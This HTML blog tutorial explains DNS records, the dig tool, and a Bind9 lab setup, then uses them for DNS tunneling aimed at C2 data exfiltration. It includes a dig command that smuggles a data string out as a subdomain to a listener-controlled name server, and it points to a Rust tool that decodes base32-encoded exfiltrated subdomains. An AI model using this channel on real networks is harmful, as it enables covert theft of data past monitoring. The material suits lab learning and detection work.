<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DNS Extraction Debugging with Dig</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      max-width: 900px;
      margin: 0 auto;
      padding: 20px;
      background-color: #f8f9fb;
      color: #333;
    }

    h1, h2, h3 {
      color: #1a1a1a;
    }

    h1 {
      text-align: center;
      font-size: 2.2em;
      margin-bottom: 10px;
    }

    h2 {
      margin-top: 40px;
      font-size: 1.8em;
      border-bottom: 2px solid #0077cc;
      padding-bottom: 10px;
    }

    h3 {
      margin-top: 30px;
      font-size: 1.4em;
      color: #0077cc;
    }

    p {
      font-size: 1.1em;
      line-height: 1.6;
      text-align: justify;
    }

    ul, ol {
      font-size: 1.1em;
      line-height: 1.6;
      margin-left: 20px;
    }

    li {
      margin: 10px 0;
    }

    code {
      background-color: #f4f4f4;
      padding: 2px 6px;
      border-radius: 3px;
      font-family: 'Courier New', monospace;
      font-size: 0.95em;
    }

    pre {
      background-color: #f4f4f4;
      padding: 15px;
      border-radius: 5px;
      overflow-x: auto;
      border-left: 4px solid #0077cc;
    }

    pre code {
      background-color: transparent;
      padding: 0;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin: 20px 0;
      background-color: #fff;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    table th, table td {
      padding: 12px;
      text-align: left;
      border: 1px solid #ddd;
    }

    table th {
      background-color: #0077cc;
      color: white;
      font-weight: bold;
    }

    .note {
      background-color: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin: 20px 0;
      border-radius: 5px;
    }

    .back-link {
      display: inline-block;
      margin-top: 40px;
      padding: 10px 20px;
      background-color: #0077cc;
      color: white;
      text-decoration: none;
      border-radius: 5px;
      transition: background-color 0.2s;
    }

    .back-link:hover {
      background-color: #005fa3;
    }

    img {
      max-width: 100%;
      height: auto;
      display: block;
      margin: 20px auto;
      border-radius: 5px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }

    strong {
      color: #1a1a1a;
    }

    a {
      color: #0077cc;
      text-decoration: none;
    }

    a:hover {
      color: #005fa3;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1>DNS Extraction Debugging with Dig</h1>

  <h2>Abstract</h2>
  <p><strong>Summary:</strong></p>
  <ol>
    <li>Domain Name System (DNS)</li>
    <li>Understanding Dig</li>
    <li>Setting up a DNS infrastructure</li>
    <li>Automating it with Rust</li>
  </ol>

  <h2>Introduction</h2>
  <p>In this article, we will explore DNS tunneling that is used in C2. The goal of this article is to go over the basics of DNS and debug a simple DNS extraction system.</p>
  <p>First, we will see how DNS works, then the next section will present the Dig binary. Finally, we will set up an infrastructure to extract data using DNS.</p>

  <h2>I. Domain Name System (DNS)</h2>
  <p>Domain Name System (DNS) is an integral part of the Internet. For example, through domain names, such as www.google.com or google.com, we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database.</p>
  <p>There are several types of DNS servers that are used worldwide:</p>
  <ul>
    <li><strong>DNS root server:</strong> Those servers are responsible for top-level domains such as .com, .org, .net, etc. There are 13 root servers around the world.</li>
    <li><strong>Authoritative name server:</strong> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Based on the country, company, etc., authoritative nameservers provide answers to recursive DNS nameservers, assisting in finding the specific web server(s).</li>
    <li><strong>Non-authoritative name server:</strong> They collect information on a specific DNS zone using recursive or iterative DNS queries without interfering with authoritative name server queries.</li>
    <li><strong>Caching server:</strong> Used to cache information for other name servers for a limited period of time.</li>
    <li><strong>Forwarding server:</strong> Only has one function, which is to be used to forward DNS queries to another DNS server.</li>
    <li><strong>Resolver:</strong> They are not authoritative servers but they perform resolution locally in a computer or router.</li>
  </ul>

  <p>DNS is mainly unencrypted. Therefore, DNS doesn't implement much security. Nonetheless, DNS Security Extension implements a layer of security by signing records to guarantee their integrity.</p>
  <p>There are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS (DoT) or DNS over HTTPS (DoH) here. In addition, the network protocol DNSCrypt also encrypts the traffic between the computer and the name server.</p>
  <p>Additionally, DNS is a stealthy protocol to use to extract data because it is used by almost all the infrastructure to make name resolution and it is rarely monitored because of the high volume of data which makes it hard to monitor by nature.</p>
  <p>A DNS query can be used to show additional information such as the email server for the domain or what the domain's name servers are called.</p>
  <p>Different DNS records are used for DNS queries, the table below explains those different records.</p>

  <table>
    <thead>
      <tr>
        <th>DNS Record</th>
        <th>Description</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>A</strong></td>
        <td>Returns an IPv4 address of the requested domain as a result.</td>
      </tr>
      <tr>
        <td><strong>AAAA</strong></td>
        <td>Returns an IPv6 address of the requested domain.</td>
      </tr>
      <tr>
        <td><strong>MX</strong></td>
        <td>Returns the responsible mail servers as a result.</td>
      </tr>
      <tr>
        <td><strong>NS</strong></td>
        <td>Returns the DNS servers (nameservers) of the domain.</td>
      </tr>
      <tr>
        <td><strong>TXT</strong></td>
        <td>This record can contain various information. The all-rounder can be used, to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.</td>
      </tr>
      <tr>
        <td><strong>CNAME</strong></td>
        <td>This record serves as an alias for another domain name. If you want the domain www.google.com to point to the same IP as google.com, you would create an A record for google.com and a CNAME record for www.google.com.</td>
      </tr>
      <tr>
        <td><strong>PTR</strong></td>
        <td>The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.</td>
      </tr>
      <tr>
        <td><strong>SOA</strong></td>
        <td>Provides information about the corresponding DNS zone and email address of the administrative contact.</td>
      </tr>
    </tbody>
  </table>

  <p>The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.</p>
  <p>To be noted that, the dots in the answer should be interpreted as @ for the email address of the zone administrator.</p>
  <img src="./image_dns_extraction/dns-soa-record.png" alt="SOA Record Example">
  <p>The email should be dns-admin@google.com here.</p>
  <p>Therefore, to extract data using DNS, we would need an A record to point to our server IP and a CNAME record in case we want to redirect it to a subdomain.</p>

  <h2>II. Understanding Dig</h2>
  <p>Domain Information Groper (Dig) is a useful tool for querying DNS servers.</p>
  <p>The format of a Dig command is as follows:</p>
  <pre><code>dig [query-type] [domain] @[server] [options]</code></pre>
  <p>The query-type specifies the type of DNS record to query, if not specified, Dig defaults to querying A records.</p>
  <p>The domain specifies the domain you are querying about.</p>
  <p>The @server is optional and is used to specify which DNS server you want to query. If omitted, dig uses the default server.</p>
  <p>The options field, Dig offers various options to format or filter the query result. For example <code>+noauthority</code> will hide the authority section and <code>+noadditional</code> will hide the additional section.</p>

  <h3>Query Result Skeleton</h3>
  <p>A full query result looks like this:</p>
  <img src="./image_dns_extraction/dig-query-result.png" alt="Dig Query Result">
  <p>Indeed, we can distinguish multiple sections in this query result.</p>
  <p>In reality, multiple sections can be shown:</p>
  <ul>
    <li><strong>The Header section</strong> provides information about the Dig query, including the query time, the server used and flags indicating here that the additional section is empty.</li>
    <li><strong>The Question section</strong> displays the domain and the type of record queried.</li>
    <li><strong>The Answer section</strong> contains information retrieved from the DNS server, which is most of the time the information we were looking for.</li>
    <li><strong>The Authority section</strong> lists the authoritative DNS servers for the queried domain.</li>
    <li><strong>The Additional section</strong> includes any other information provided by the DNS server.</li>
  </ul>
  <p>By default, Dig shows all the possible sections returned in the query result.</p>

  <h3>Dig Options</h3>
  <p>Dig offers a lot of useful options, for example in order for the query to be easily read, the <code>+short</code> option can be used.</p>
  <pre><code>dig google.com +short
172.217.18.206</code></pre>
  <p>To perform reverse DNS lookup the <code>-x</code> option is used:</p>
  <pre><code>dig -x 172.217.18.206 +short
google.com</code></pre>
  <p>Some very interesting options are:</p>
  <ul>
    <li><code>+trace</code> to get all the hops the DNS query had to do to eventually resolve the DNS query.</li>
    <li><code>+dnssec</code> which is to debug DNSSEC which is used to secure DNS.</li>
    <li><code>+noall +answer +stats</code> which displays only the Answer section with statistics.</li>
    <li><code>-f queries.txt</code> which is the Dig command used in batch mode to execute multiple queries from a file.</li>
    <li><code>+multiline</code> displays the output on several lines which makes it more readable.</li>
  </ul>
  <p>I hope you got to grasp a bit more how Dig works, we will carry on implementing a Bind9 DNS server in order to deploy an infrastructure allowing us to test DNS extraction.</p>

  <h2>III. Setting Up a DNS Infrastructure</h2>
  <p>An Arch Linux will be used for this part with a bridge network setup. The files won't be placed in the same folders as a Debian-based distribution for example. A guide to bind9 for Debian can be found here: <a href="https://wiki.debian.org/BIND9?action=show&redirect=Bind9" target="_blank">https://wiki.debian.org/BIND9</a></p>
  <p>All DNS servers work with three different types of configuration files:</p>
  <ol>
    <li>Local DNS configuration files</li>
    <li>Zone files</li>
    <li>Reverse name resolution files</li>
  </ol>
  <p>The Bind9 DNS server is often used on Linux distributions. The local configuration files are usually:</p>
  <ul>
    <li><strong>/etc/named.conf:</strong> where we will define our own DNS zone.</li>
    <li><strong>Options section of named.conf:</strong> where we will define global server options.</li>
    <li><strong>Logging section of named.conf:</strong> where we will define the logging configuration.</li>
  </ul>
  <p>Our named.conf file will look like this:</p>
  <pre><code>zone "myextractiondomain.com" {
  type master;
  file "db.myextractiondomain.com";
};</code></pre>

  <p>A zone file such as <code>/var/named/db.myextractiondomain.com</code> is a text file that describes a DNS zone with the BIND file format. There must be precisely one SOA record and at least one NS record.</p>
  <pre><code>;
; BIND reverse data file for local loopback interface
;
$ORIGIN myextractiondomain.com.
$TTL 86400
@ IN SOA ns1.myextractiondomain.com. myemail.myextractiondomain.com. (
    2001062501 ; serial
    21600      ; refresh after 6 hours
    3600       ; retry after 1 hour
    604800     ; expire after 1 week
    86400 )    ; minimum TTL of 1 day

IN NS ns1.myextractiondomain.com.
ns1 IN A 192.168.1.15</code></pre>

  <p>For the Fully Qualified Domain Name (FQDN) to be resolved from the IP address, the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. For this purpose a <code>/var/named/db.192.168.1</code> file should be created containing the PTR record:</p>
  <pre><code>;
; BIND reverse data file for local loopback interface
;
$ORIGIN 192.168.1.in-addr.arpa
$TTL 86400
15 IN PTR ns1.domain.com.</code></pre>

  <div class="note">
    <strong>Remark:</strong> We truncate (shorten) the reverse zone name for example, 1.168.192.in-addr.arpa instead of the full 192.168.1.15.in-addr.arpa because reverse DNS zones describe entire networks or subnets, not single IP addresses.
  </div>

  <p>We will now go through the actual implementation using Arch Linux, first we need to install the required packages.</p>
  <pre><code>pacman -Sy bind
sudo systemctl start named</code></pre>

  <p>We also need a fast and granular way to reload our configuration for that we will use rndc. I advise you to follow the 2.1 section to configure rndc: <a href="https://wiki.archlinux.org/title/BIND" target="_blank">https://wiki.archlinux.org/title/BIND</a>. For the sake of simplicity, we will generate the configuration with:</p>
  <pre><code>sudo rndc-confgen</code></pre>

  <p>Then this command generate a configuration for <code>/etc/named.conf</code> and <code>/etc/rndc.conf</code> which will be used to make rndc communicate with our bind9 DNS server.</p>
  <p>Therefore, we need to reload the DNS server for the configuration to be taken into account:</p>
  <pre><code>sudo systemctl restart named</code></pre>

  <p>After this, we should be able to use:</p>
  <pre><code>rndc status</code></pre>

  <p>Then, if we add the modification that we previously discussed for our <code>/etc/named.conf</code> successfully adding the myextractiondomain.com zone, and creating the <code>/var/named/db.myextractiondomain.com</code> zone file and the <code>/var/named/db.192.168.1</code> reverse lookup file.</p>
  <p>It is important to set ownership to those files to named user and to give the 640 permissions which RW for the owner and R for the group:</p>
  <pre><code>sudo chown -hR named:named /var/named/db.myextractiondomain.com
sudo chown -hR named:named /var/named/db.192.168.1
sudo chmod 640 /var/named/db.myextractiondomain.com
sudo chmod 640 /var/named/db.192.168.1
rndc reload</code></pre>

  <p>For debugging, system logs for the bind9 service can be examine like this:</p>
  <pre><code>journalctl -u named -b | grep myextractiondomain</code></pre>

  <p>Once the server is reloaded, we should be able to use the dig command from the host or another bridged VM in order to see our NS and SOA record:</p>
  <img src="./image_dns_extraction/dns-ns-soa-query.png" alt="NS and SOA Record Query">

  <p>We can even inspect the A record we had:</p>
  <img src="./image_dns_extraction/dns-a-record-query.png" alt="A Record Query">

  <p>If we make our A record point to our VM IP address and start a listener on port 53, we can see our ANY DNS query:</p>
  <img src="./image_dns_extraction/dns-any-query.png" alt="ANY Query Result">

  <p>Moreover, if we want to extract data on a subdomain, we can add a CNAME record that points to a A record by adding those lines to our zone file:</p>
  <pre><code>extract IN A 192.168.1.181
sub.myextractiondomain.com. IN CNAME extract.myextractiondomain.com.</code></pre>

  <p>And then reload the configuration using rndc.</p>
  <p>Now we should see our A record if we query it:</p>
  <img src="./image_dns_extraction/dns-cname-query.png" alt="CNAME Query Result">

  <p>Starting our Tcpdump listener on port 53, we should be able to extract data using DNS:</p>
  <pre><code>sudo tcpdump -i enp0s3 -n port 53</code></pre>

  <p>Sending the sensitivedataextracted string using Dig on the subdomain from an external computer:</p>
  <pre><code>dig any sensitivedatadextracted.extract.myextractiondomain.com @192.168.1.180</code></pre>

  <p>We observe the following response from the Tcpdump listener:</p>
  <img src="./image_dns_extraction/dns-extraction-tcpdump.png" alt="Tcpdump Extraction Result">

  <p>We successfully observed that data were extracted using DNS protocol.</p>

  <h2>IV. Automating it with Rust</h2>
  <p>In this part, we will automate the process to extract encoded DNS data.</p>
  <p>Hence, a Rust crate was created which starts a DNS server and decode base32 encoded subdomain sent from the client.</p>
  <p>The project can be found at this URL: <a href="https://github.com/Eyilink/dns_tunneling" target="_blank">Dns Tunneling | Eyilink</a></p>
  <p>To start the DNS server, you need to install cargo which is Rust packet manager:</p>
  <pre><code>curl --proto '=https' --tlsv1.2 https://sh.rustup.rs -sSf | sh
rustup update
cd dns_tunneling && cargo run</code></pre>

  <p>You should be presented with the following view:</p>
  <img src="./image_dns_extraction/rust-dns-server-start.png" alt="Rust DNS Server Starting">

  <p>By first encoding our data in base32 and then using dig to send it to our server:</p>
  <img src="./image_dns_extraction/base32-encode-dig.png" alt="Base32 Encoding and Dig">

  <p>We observe the following successful response from the server:</p>
  <img src="./image_dns_extraction/rust-dns-decode-success.png" alt="DNS Server Decode Success">

  <h2>Conclusion</h2>
  <p>That's all for this article, we explored the depth of Dig and DNS tunneling techniques. We've learned how DNS works, how to use Dig for querying DNS servers, how to set up a complete DNS infrastructure with Bind9, and finally how to automate DNS data extraction using Rust.</p>
  <p>DNS tunneling remains an important technique in cybersecurity, both for understanding potential attack vectors and for legitimate use cases such as data exfiltration testing in controlled environments. The stealthy nature of DNS traffic makes it a valuable tool for security professionals to understand and monitor.</p>

  <a href="../index.html" class="back-link">‚Üê Back to Blog</a>
</body>
</html>